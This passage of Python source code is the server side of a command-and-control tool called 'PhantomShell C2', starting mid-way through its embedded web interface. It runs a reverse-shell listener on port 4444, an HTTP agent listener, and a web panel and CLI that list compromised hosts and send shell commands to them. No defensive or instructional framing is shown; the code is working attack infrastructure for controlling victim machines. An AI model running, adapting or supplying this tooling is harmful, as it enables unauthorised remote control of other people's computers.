  out.innerHTML = out.innerHTML.replace('<span class="sys">// executing...</span>\n', '');

  if (data && data.output !== undefined) {
    if (data.output.startsWith('[queued]')) {
      out.innerHTML += `<span class="queued">${escHtml(data.output)}</span>\n\n`;
    } else {
      const cls = data.output.includes('error') || data.output.includes('Error') ? 'err-out' : 'out';
      out.innerHTML += `<span class="${cls}">${escHtml(data.output)}</span>\n\n`;
    }
  } else {
    out.innerHTML += `<span class="err-out">// no response or session dead</span>\n\n`;
  }
  out.scrollTop = out.scrollHeight;
}

function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
</script>
</body>
</html>"""


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, *_): pass

    def send_json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def send_html(self, html: str):
        body = html.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Authorization,Content-Type")
        self.end_headers()

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/" or path == "/index.html":
            self.send_html(HTML_PAGE)
            return

        if path == "/api/sessions":
            if not check_auth(self):
                self.send_json({"error": "unauthorized"}, 401); return
            SM.prune()
            self.send_json({"sessions": [s.info_dict() for s in SM.all()]})
            return

        if path == "/api/logs":
            if not check_auth(self):
                self.send_json({"error": "unauthorized"}, 401); return
            self.send_json({"logs": LOG[-100:]})
            return

        self.send_json({"error": "not found"}, 404)

    def do_POST(self):
        path = urlparse(self.path).path
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length) or b"{}") if length else {}

        if path == "/api/login":
            pw = body.get("password", "")
            if pw == WEB_PASSWORD:
                t = make_token(pw + str(time.time()))
                TOKENS.add(t)
                self.send_json({"ok": True, "token": t})
            else:
                log(f"Failed login from {self.client_address[0]}", "err")
                self.send_json({"ok": False})
            return

        if not check_auth(self):
            self.send_json({"error": "unauthorized"}, 401); return

        if path == "/api/exec":
            sid = body.get("session_id")
            cmd = body.get("command", "")
            sess = SM.get(sid)
            if not sess:
                self.send_json({"error": "session not found"}); return
            if not sess.alive:
                self.send_json({"output": "[session is dead]"}); return
            log(f"#{sid} CMD: {cmd}", "star")
            output = sess.send(cmd)
            sess.last_seen = datetime.datetime.now()
            self.send_json({"output": output})
            return

        self.send_json({"error": "not found"}, 404)


def web_server(host: str, port: int):
    srv = HTTPServer((host, port), C2Handler)
    log(f"Web UI on http://{host}:{port}", "ok")
    srv.serve_forever()


# ══════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════

def cli_loop():
    time.sleep(1)
    print(f"\n{INFO} Type {C['c']}help{C['R']} for commands.\n")

    while True:
        try:
            line = input(f"{C['r']}phantom{C['R']} > ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not line:
            continue

        parts = line.split(None, 2)
        cmd = parts[0].lower()

        if cmd in ("help", "?"):
            print(f"""
  {C['c']}sessions{C['R']}              — list all sessions
  {C['c']}interact <id>{C['R']}         — interact with a session
  {C['c']}exec <id> <cmd>{C['R']}       — run single command
  {C['c']}kill <id>{C['R']}             — mark session dead
  {C['c']}prune{C['R']}                 — remove dead sessions
  {C['c']}exit{C['R']}                  — quit C2 server
""")

        elif cmd == "sessions":
            SM.prune()
            sessions = SM.all()
            if not sessions:
                print(f"  {C['d']}no sessions{C['R']}")
                continue
            print(f"\n  {'ID':<5} {'TYPE':<6} {'IP':<18} {'USER@HOST':<32} {'STATUS':<8} CONNECTED")
            print(f"  {'─'*5} {'─'*6} {'─'*18} {'─'*32} {'─'*8} {'─'*20}")
            for s in sessions:
                status = f"{C['g']}ALIVE{C['R']}" if s.alive else f"{C['r']}DEAD{C['R']}"
                stype = f"{C['c']}{s.type}{C['R']}" if s.type == 'tcp' else f"{C['y']}{s.type}{C['R']}"
                print(f"  {s.id:<5} {stype:<6} {s.addr:<18} {s.username+'@'+s.hostname:<32} {status:<20} {s.connected.strftime('%H:%M:%S')}")
            print()

        elif cmd == "interact" and len(parts) >= 2:
            try:
                sid = int(parts[1])
                sess = SM.get(sid)
                if not sess:
                    print(f"  {ERR} session {sid} not found")
                    continue
                if not sess.alive:
                    print(f"  {ERR} session {sid} is dead")
                    continue
                is_tcp = sess.type == 'tcp'
                print(f"\n  {OK} Interacting with #{sid} ({sess.username}@{sess.hostname}) [{sess.type.upper()}]")
                print(f"  {C['d']}Type 'back' to return to C2{C['R']}\n")
                while sess.alive:
                    try:
                        prompt = f"  {C['c']}{'PS' if is_tcp else 'HTTP'} #{sid}{C['R']} > "
                        icmd = input(prompt).strip()
                    except (EOFError, KeyboardInterrupt):
                        break
                    if icmd.lower() == "back":
                        break
                    if icmd:
                        out = sess.send(icmd)
                        print(f"{C['g']}{out}{C['R']}\n")
            except ValueError:
                print(f"  {ERR} invalid session id")

        elif cmd == "exec" and len(parts) >= 3:
            try:
                sid = int(parts[1])
                icmd = parts[2]
                sess = SM.get(sid)
                if not sess:
                    print(f"  {ERR} session not found"); continue
                out = sess.send(icmd)
                print(f"{C['g']}{out}{C['R']}")
            except ValueError:
                print(f"  {ERR} invalid session id")

        elif cmd == "kill" and len(parts) >= 2:
            try:
                sid = int(parts[1])
                sess = SM.get(sid)
                if sess:
                    sess.alive = False
                    print(f"  {OK} session {sid} marked dead")
            except ValueError:
                pass

        elif cmd == "prune":
            SM.prune()
            print(f"  {OK} dead sessions removed")

        elif cmd in ("exit", "quit"):
            print(f"\n{ERR} Shutting down C2...\n")
            os._exit(0)

        else:
            print(f"  {C['d']}unknown command — type 'help'{C['R']}")


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

def get_args():
    p = argparse.ArgumentParser(
        prog=f"python3 {sys.argv[0]}",
        description="PhantomShell C2 Server — Professional Edition",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    p.add_argument("--port", type=int, default=4444, help="TCP shell listener port (default: 4444)")
    p.add_argument("--http-port", type=int, default=8081, help="HTTP agent listener port (default: 8081)")
    p.add_argument("--web-port", type=int, default=8080, help="Web UI port (default: 8080)")
    p.add_argument("--password", default="phantomshell", help="Web UI password (default: phantomshell)")
    p.add_argument("--no-cli", action="store_true", help="Disable interactive CLI")
    p.add_argument("--no-banner", action="store_true")
    return p.parse_args()


def main():
    args = get_args()

    global WEB_PASSWORD
    WEB_PASSWORD = args.password

    signal.signal(signal.SIGINT, lambda s, f: (print(f"\n{ERR} Shutting down..."), os._exit(0)))

    if not args.no_banner:
        banner()

    log(f"PhantomShell C2 v{VERSION} starting...", "star")
    log(f"TCP listener   : {args.host}:{args.port}", "info")
    log(f"HTTP agent     : http://{args.host}:{args.http_port}", "info")
    log(f"Web UI         : http://{args.host}:{args.web_port}", "info")
    log(f"Password       : {args.password}", "info")
    print()

    # Start TCP listener
    t1 = threading.Thread(target=tcp_listener, args=(args.host, args.port), daemon=True)
    t1.start()

    # Start HTTP agent listener
    t2 = threading.Thread(target=http_agent_listener, args=(args.host, args.http_port), daemon=True)
    t2.start()

    # Start web server
    t3 = threading.Thread(target=web_server, args=(args.host, args.web_port), daemon=True)
    t3.start()

    if not args.no_cli:
        cli_loop()
    else:
        t1.join()


if __name__ == "__main__":
    main()
